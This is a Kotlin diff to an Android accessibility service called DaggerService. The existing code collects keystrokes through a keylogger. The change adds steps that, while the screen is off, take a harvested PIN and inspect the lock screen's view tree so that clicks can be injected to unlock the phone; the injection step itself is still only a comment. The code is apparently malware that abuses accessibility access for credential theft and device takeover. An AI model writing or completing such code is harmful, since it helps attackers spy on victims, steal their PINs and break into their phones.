@@ -19,6 +19,7 @@ import android.content.IntentFilter
 import android.os.Build
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
+import android.widget.FrameLayout
 
 class DaggerService : AccessibilityService() {
 
@@ -67,15 +68,20 @@ class DaggerService : AccessibilityService() {
 
                     AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                         val screenState = SharedPreferencesQuery.getScreenState(this)
-                        Log.d(TAG, "Screen is $screenState")
                         if (screenState == ScreenState.OFF) {
                             val pin = SharedPreferencesQuery.getNextPin(this)
-                            if (pin != null) {
-                                Log.d(TAG, "Attempting with PIN: $pin")
-                            } else {
-                                Log.d(TAG, "No PINs collected yet")
+                            val parent = event.source?.parent
+                            if (pin != null && parent != null) {
+                                Log.d(TAG, "Screen is off. Attempting to unlock with PIN: $pin")
+                                // Inject click events to accessibility events.
+                                Log.d(TAG, "Parent: $parent)")
+                                (0 until parent.childCount).forEach {
+                                    val child = parent.getChild(it)
+                                    Log.d(TAG, "Child: $child")
+                                }
                             }
                         }
+                        event.recycle()
                     }
                 }
             }
@@ -95,14 +101,6 @@ class DaggerService : AccessibilityService() {
                             val keystrokes = keyLogger.emptyKeyQueue()
                             Log.d(TAG, "Got keystrokes: $keystrokes")
                         }
-                    }
-                }
-            }
-
-            packageName -> {
-                when (event.className) {
-                    LockScreenActivity::class.java.name -> {
-                        Log.d(TAG, "Event received from lock screen")
                     }
                 }
             }
